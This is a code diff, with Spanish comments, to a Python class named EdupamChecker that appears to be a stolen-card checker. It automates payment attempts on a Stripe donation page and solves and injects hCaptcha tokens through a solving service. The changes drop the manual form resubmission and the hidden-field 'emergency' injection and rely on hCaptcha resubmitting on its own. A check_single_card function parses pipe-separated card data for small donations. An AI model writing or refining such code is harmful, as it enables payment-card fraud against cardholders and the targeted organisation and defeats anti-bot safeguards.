@@ -849,7 +849,7 @@ class EdupamChecker:
 
 
     def solve_captcha_if_present(self, page, card_last4):
-        """Detectar y resolver hCaptcha - VERSIÓN CON ESCAPE DE TOKEN"""
+        """Detectar y resolver hCaptcha - VERSIÓN FINAL (sin reenvío manual)"""
         try:
             time.sleep(3)
             
@@ -956,14 +956,14 @@ class EdupamChecker:
                 
                 logger.info(f"✅ DESAFÍO VISIBLE resuelto para ****{card_last4}")
                 
-                # ========== INYECCIÓN CON ESCAPE CORRECTO ==========
+                # ========== SOLO INYECTAR - NO REENVIAR ==========
                 try:
-                    # MÉTODO 1: Inyección directa en el iframe con JSON.stringify
+                    # Inyectar solución en el iframe visible
                     injection_result = challenge_frame.evaluate("""
                         (solution) => {
                             console.log('🎯 Inyectando solución en iframe visible...');
                             
-                            // Buscar el campo de respuesta
+                            // Buscar campo de respuesta
                             let field = document.querySelector('[name="h-captcha-response"]');
                             if (!field) {
                                 field = document.getElementById('h-captcha-response');
@@ -971,9 +971,12 @@ class EdupamChecker:
                             
                             if (field) {
                                 field.value = solution;
+                                
+                                // Disparar eventos para que hCaptcha detecte el cambio
                                 field.dispatchEvent(new Event('input', { bubbles: true }));
                                 field.dispatchEvent(new Event('change', { bubbles: true }));
-                                console.log('✅ Solución inyectada en iframe visible');
+                                
+                                console.log('✅ Solución inyectada - hCaptcha reenviará automáticamente');
                                 return true;
                             }
                             return false;
@@ -981,142 +984,27 @@ class EdupamChecker:
                     """, solution)
                     
                     logger.info(f"💉 Inyección en iframe visible: {injection_result}")
-                    time.sleep(2)
                     
-                    # MÉTODO 2: Notificar a Stripe usando JSON.stringify para escapar el token
-                    page.evaluate("""
-                        (solution) => {
-                            // Notificar a Stripe
-                            if (window.hcaptcha) {
-                                try {
-                                    window.hcaptcha.response = solution;
-                                    window.hcaptcha.execute();
-                                } catch(e) {
-                                    console.log('Error hcaptcha:', e);
-                                }
-                            }
-                            
-                            // Disparar evento con el token escapado
-                            try {
-                                const event = new CustomEvent('hcaptchaResponse', {
-                                    detail: { response: solution }
-                                });
-                                window.dispatchEvent(event);
-                            } catch(e) {
-                                console.log('Error evento:', e);
-                            }
-                            
-                            // Método adicional: Buscar callback de Stripe
-                            if (window.parent && window.parent.postMessage) {
-                                window.parent.postMessage({
-                                    type: 'hcaptchaResponse',
-                                    response: solution
-                                }, '*');
-                            }
-                            
-                            return true;
-                        }
-                    """, solution)
+                    # NOTA: NO hacer clic en el botón ni submit manual
+                    # hCaptcha detecta el token y reenvía automáticamente
                     
-                    time.sleep(2)
+                    # Solo esperar a que la página procese el token
+                    time.sleep(5)
                     
-                    # ========== REENVIAR FORMULARIO ==========
-                    logger.info("🔄 Reenviando formulario...")
+                    # Verificar si la página cambió (URL o contenido)
+                    current_url = page.url
+                    logger.info(f"📄 URL después de inyección: {current_url}")
                     
-                    # Intentar múltiples formas de submit
-                    submit_success = False
+                    # Si la URL sigue siendo la misma, puede que necesite más tiempo
+                    if '/dona/' in current_url:
+                        logger.info("⏳ Esperando respuesta de hCaptcha/Stripe...")
+                        time.sleep(5)
                     
-                    # Método 1: Click en botón
-                    try:
-                        btn = page.locator('#btn-donation')
-                        if btn.count() > 0:
-                            btn.first.click(timeout=5000)
-                            logger.info("✅ Click en #btn-donation")
-                            time.sleep(5)
-                            submit_success = True
-                    except Exception as e:
-                        logger.warning(f"⚠️ Click en botón falló: {e}")
-                    
-                    # Método 2: Submit del form
-                    if not submit_success:
-                        form_submit = page.evaluate("""
-                            () => {
-                                const form = document.querySelector('form');
-                                if (form) {
-                                    form.submit();
-                                    return true;
-                                }
-                                return false;
-                            }
-                        """)
-                        if form_submit:
-                            logger.info("✅ Submit del formulario vía JavaScript")
-                            time.sleep(5)
-                            submit_success = True
-                    
-                    # Método 3: Stripe specific
-                    if not submit_success:
-                        stripe_submit = page.evaluate("""
-                            () => {
-                                if (window.stripe && window.stripe.confirmDonation) {
-                                    window.stripe.confirmDonation();
-                                    return true;
-                                }
-                                return false;
-                            }
-                        """)
-                        if stripe_submit:
-                            logger.info("✅ Stripe.confirmDonation ejecutado")
-                            time.sleep(5)
-                            submit_success = True
-                    
-                    if submit_success:
-                        logger.info("✅ Formulario reenviado exitosamente")
-                        return True
-                    else:
-                        logger.error("❌ No se pudo reenviar el formulario")
-                        
-                        # Último intento: Forzar navegación
-                        page.goto(page.url)
-                        time.sleep(3)
-                        return False
+                    return True
                     
                 except Exception as e:
                     logger.error(f"❌ Error en inyección en iframe visible: {e}")
-                    
-                    # MÉTODO DE EMERGENCIA: Inyección alternativa
-                    try:
-                        logger.info("🔄 Intentando método de emergencia...")
-                        
-                        # Inyectar directamente en el DOM de la página principal
-                        emergency_inject = page.evaluate("""
-                            (solution) => {
-                                // Crear campo oculto en página principal
-                                let field = document.createElement('textarea');
-                                field.name = 'h-captcha-response';
-                                field.id = 'h-captcha-response';
-                                field.style.display = 'none';
-                                field.value = solution;
-                                document.body.appendChild(field);
-                                
-                                // Intentar submit
-                                const form = document.querySelector('form');
-                                if (form) {
-                                    form.submit();
-                                    return true;
-                                }
-                                return false;
-                            }
-                        """, solution)
-                        
-                        if emergency_inject:
-                            logger.info("✅ Método de emergencia ejecutado")
-                            time.sleep(5)
-                            return True
-                        
-                    except Exception as e2:
-                        logger.error(f"❌ Método de emergencia falló: {e2}")
-                        return False
+                    return False
                     
             except Exception as e:
                 logger.error(f"❌ Error en proceso AntiCaptcha: {e}")
@@ -1125,7 +1013,9 @@ class EdupamChecker:
         except Exception as e:
             logger.error(f"❌ Error en solve_captcha_if_present: {e}")
             return False
+        
 
+        
     def check_single_card(self, card_string, amount=50):
         """Verificar una sola tarjeta"""
         card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
